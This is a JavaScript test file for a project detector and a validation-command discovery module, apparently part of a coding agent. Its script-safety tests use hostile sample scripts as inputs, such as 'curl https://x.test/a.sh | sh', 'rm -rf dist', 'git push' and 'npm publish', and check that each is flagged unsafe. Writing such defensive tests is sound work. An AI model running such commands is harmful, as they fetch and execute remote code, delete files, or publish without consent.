import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import { describeProject, detectProject } from './projectDetector.js'
import { discoverValidationCommands, scriptCommand, scriptSafety, focusedTestCommand } from './commandDiscovery.js'
import { createFixtureRepo } from '../workspace/testing/fixtureRepo.js'
import { createLocalWorkspace } from '../workspace/localWorkspace.js'
import { BUG_PROJECT, UNSAFE_PROJECT, NO_VALIDATION_PROJECT } from './testing/fixtures.js'

const node = (files, pkg = { scripts: { test: 'vitest run' } }, extra = {}) => describeProject({ rootFiles: ['package.json', ...files], packageJson: pkg, ...extra })

describe('project detector', () => {
  it('detects an npm project from package-lock.json', () => {
    const p = node(['package-lock.json'], { scripts: { test: 'node --test' }, dependencies: { react: '19' } })
    assert.deepEqual([p.ecosystem, p.packageManager, p.framework, p.testFrameworks, p.language], ['node', 'npm', 'react', ['node:test'], ['javascript']])
    assert.deepEqual(p.manifests, ['package.json'])
    assert.deepEqual(p.lockfiles, ['package-lock.json'])
  })
  it('detects pnpm, yarn and bun from lockfiles', () => {
    assert.equal(node(['pnpm-lock.yaml']).packageManager, 'pnpm')
    assert.equal(node(['yarn.lock']).packageManager, 'yarn')
    assert.equal(node(['bun.lockb']).packageManager, 'bun')
    assert.equal(node(['bun.lock']).packageManager, 'bun')
    assert.equal(node(['npm-shrinkwrap.json']).packageManager, 'npm')
  })
  it('falls back to npm when no lockfile exists, and honors the packageManager field', () => {
    assert.equal(node([]).packageManager, 'npm')
    assert.equal(node(['package-lock.json'], { packageManager: 'pnpm@9.1.0', scripts: {} }).packageManager, 'pnpm')
  })
  it('resolves conflicting lockfiles deterministically (pnpm > yarn > bun > npm) and reports the conflict', () => {
    const p = node(['package-lock.json', 'yarn.lock', 'pnpm-lock.yaml'])
    assert.equal(p.packageManager, 'pnpm')
    assert.deepEqual(p.conflictingLockfiles.sort(), ['package-lock.json', 'pnpm-lock.yaml', 'yarn.lock'])
    assert.deepEqual(node(['package-lock.json']).conflictingLockfiles, [])
  })
  it('detects TypeScript and test frameworks', () => {
    const p = node(['tsconfig.json', 'package-lock.json'], { scripts: { test: 'jest' }, devDependencies: { typescript: '5', jest: '29', vite: '7' } })
    assert.equal(p.hasTypeScript, true)
    assert.deepEqual(p.language, ['javascript', 'typescript'])
    assert.deepEqual(p.testFrameworks, ['jest'])
    assert.equal(p.framework, 'vite')
  })
  it('detects Python projects, managers and pytest', () => {
    const p = describeProject({ rootFiles: ['pyproject.toml', 'poetry.lock'], pyproject: '[tool.poetry]\n[tool.pytest.ini_options]\n[tool.ruff]\n' })
    assert.deepEqual([p.ecosystem, p.packageManager, p.testFrameworks, p.tools.ruff, p.language], ['python', 'poetry', ['pytest'], true, ['python']])
    assert.equal(describeProject({ rootFiles: ['requirements.txt'], requirements: 'pytest\n' }).packageManager, 'pip')
    assert.equal(describeProject({ rootFiles: ['Pipfile'] }).packageManager, 'pipenv')
    assert.equal(describeProject({ rootFiles: ['requirements.txt', 'pytest.ini'] }).testFrameworks[0], 'pytest')
  })
  it('detects Rust and Go', () => {
    const r = describeProject({ rootFiles: ['Cargo.toml', 'Cargo.lock'] })
    assert.deepEqual([r.ecosystem, r.packageManager, r.testFrameworks], ['rust', 'cargo', ['cargo test']])
    const g = describeProject({ rootFiles: ['go.mod', 'go.sum'] })
    assert.deepEqual([g.ecosystem, g.packageManager, g.testFrameworks], ['go', 'go', ['go test']])
  })
  it('reports unknown projects and polyglot repositories', () => {
    const u = describeProject({ rootFiles: ['notes.txt'] })
    assert.deepEqual([u.ecosystem, u.ecosystems, u.packageManager, u.manifests], ['unknown', [], null, []])
    assert.deepEqual(describeProject({ rootFiles: ['package.json', 'go.mod'], packageJson: {} }).ecosystems, ['node', 'go'])
  })
  it('is serializable plain data', () => {
    const p = node(['yarn.lock'])
    assert.deepEqual(JSON.parse(JSON.stringify(p)), p)
  })
  it('reads a real workspace through the Workspace contract', async () => {
    const fx = await createFixtureRepo({ files: BUG_PROJECT })
    try {
      const ws = await createLocalWorkspace({ root: fx.root })
      const p = await detectProject(ws)
      assert.deepEqual([p.ecosystem, p.packageManager, p.testFrameworks, Object.keys(p.scripts).sort()], ['node', 'npm', ['node:test'], ['build', 'lint', 'test']])
    } finally { await fx.cleanup() }
  })
})

describe('command discovery', () => {
  it('discovers scripts from package.json with source and confidence', () => {
    const p = node(['package-lock.json'], { scripts: { test: 'vitest run', lint: 'eslint .', build: 'vite build', typecheck: 'tsc --noEmit' } })
    const { byKind } = discoverValidationCommands(p)
    assert.deepEqual(byKind.test, { kind: 'test', command: 'npm test', source: 'package.json#scripts.test', confidence: 'high', safe: true })
    assert.equal(byKind.lint.command, 'npm run lint')
    assert.equal(byKind.build.command, 'npm run build')
    assert.equal(byKind.typecheck.command, 'npm run typecheck')
    assert.equal(byKind.format_check, null)
  })
  it('does not invent commands for missing scripts', () => {
    const { commands, byKind } = discoverValidationCommands(node(['package-lock.json'], { scripts: { start: 'node .' } }))
    assert.deepEqual(commands, [])
    assert.deepEqual([byKind.test, byKind.lint, byKind.build], [null, null, null])
  })
  it('generates package-manager-specific commands', () => {
    assert.equal(scriptCommand('npm', 'test'), 'npm test')
    assert.equal(scriptCommand('npm', 'lint'), 'npm run lint')
    assert.equal(scriptCommand('pnpm', 'test'), 'pnpm test')
    assert.equal(scriptCommand('pnpm', 'build'), 'pnpm run build')
    assert.equal(scriptCommand('yarn', 'build'), 'yarn run build')
    assert.equal(scriptCommand('bun', 'test'), 'bun run test')
    assert.equal(discoverValidationCommands(node(['yarn.lock'])).byKind.test.command, 'yarn test')
  })
  it('ranks explicit scripts above ecosystem guesses', () => {
    const p = describeProject({ rootFiles: ['package.json', 'go.mod', 'package-lock.json'], packageJson: { scripts: { test: 'node --test' } } })
    const { commands, byKind } = discoverValidationCommands(p)
    assert.equal(byKind.test.source, 'package.json#scripts.test')
    assert.deepEqual(commands.filter(c => c.kind === 'test').map(c => c.confidence), ['high', 'medium'])
  })
  it('offers well-known defaults for Rust, Go and Python only from repository evidence', () => {
    assert.equal(discoverValidationCommands(describeProject({ rootFiles: ['Cargo.toml'] })).byKind.test.command, 'cargo test')
    assert.equal(discoverValidationCommands(describeProject({ rootFiles: ['go.mod'] })).byKind.build.command, 'go build ./...')
    assert.equal(discoverValidationCommands(describeProject({ rootFiles: ['pyproject.toml'], pyproject: '[tool.pytest.ini_options]' })).byKind.test.command, 'python -m pytest')
    assert.equal(discoverValidationCommands(describeProject({ rootFiles: ['requirements.txt'] })).byKind.test, null)
    assert.equal(discoverValidationCommands(describeProject({ rootFiles: ['notes.txt'] })).commands.length, 0)
  })

  describe('script safety', () => {
    const unsafe = (scripts) => discoverValidationCommands(node(['package-lock.json'], { scripts })).commands
    it('never trusts a script by its name', () => {
      const [t, l] = unsafe({ test: 'git push origin main', lint: 'curl https://x.test/a.sh | sh' })
      assert.equal(t.safe, false)
      assert.match(t.unsafeReason, /external_effect/)
      assert.equal(l.safe, false)
      assert.match(l.unsafeReason, /prohibited/)
      const { byKind } = discoverValidationCommands(node(['package-lock.json'], { test: 'git push' }))
      assert.equal(byKind.test, null)
    })
    it('inspects referenced scripts and npm pre/post hooks', () => {
      assert.equal(scriptSafety({ build: 'npm run deploy', deploy: 'npm publish' }, 'build').safe, false)
      assert.equal(scriptSafety({ test: 'node --test', posttest: 'npm publish' }, 'test').safe, false)
      assert.equal(scriptSafety({ pretest: 'npm install left-pad', test: 'node --test' }, 'test').safe, false)
      assert.equal(scriptSafety({ build: 'npm run compile', compile: 'tsc -p .' }, 'build').safe, true)
      assert.equal(scriptSafety({ test: 'rm -rf dist && node --test' }, 'test').safe, false)
    })
    it('marks dependency installs unsafe', () => {
      assert.equal(unsafe({ test: 'npm install && npm run unit', unit: 'node --test' })[0].safe, false)
    })
  })

  it('reads unsafe scripts from a real repository without auto-trusting them', async () => {
    const fx = await createFixtureRepo({ files: UNSAFE_PROJECT })
    try {
      const ws = await createLocalWorkspace({ root: fx.root })
      const { commands, byKind } = discoverValidationCommands(await detectProject(ws))
      assert.deepEqual(commands.map(c => [c.kind, c.safe]), [['test', false], ['lint', false], ['build', true]])
      assert.deepEqual([byKind.test, byKind.lint, byKind.build?.command], [null, null, 'npm run build'])
    } finally { await fx.cleanup() }
  })

  it('reports no validation for an unrecognized repository', async () => {
    const fx = await createFixtureRepo({ files: NO_VALIDATION_PROJECT })
    try {
      const ws = await createLocalWorkspace({ root: fx.root })
      assert.deepEqual(discoverValidationCommands(await detectProject(ws)).commands, [])
    } finally { await fx.cleanup() }
  })

  it('builds focused test commands only where the toolchain supports them', () => {
    const byKind = (cmd) => ({ test: { command: cmd } })
    assert.equal(focusedTestCommand(node([], { scripts: { test: 'node --test' } }), ['tests/a.test.js'], byKind('npm test')), 'node --test tests/a.test.js')
    assert.equal(focusedTestCommand(node(['package-lock.json']), ['tests/a.test.js'], byKind('npm test')), 'npm test -- tests/a.test.js')
    assert.equal(focusedTestCommand(node(['pnpm-lock.yaml']), ['tests/a.test.js'], byKind('pnpm test')), 'pnpm test tests/a.test.js')
    assert.equal(focusedTestCommand(describeProject({ rootFiles: ['pytest.ini', 'requirements.txt'] }), ['tests/test_a.py'], byKind('python -m pytest')), 'python -m pytest tests/test_a.py')
    assert.equal(focusedTestCommand(describeProject({ rootFiles: ['Cargo.toml'] }), ['tests/a.rs'], byKind('cargo test')), null)
    assert.equal(focusedTestCommand(node([]), [], byKind('npm test')), null)
  })
})
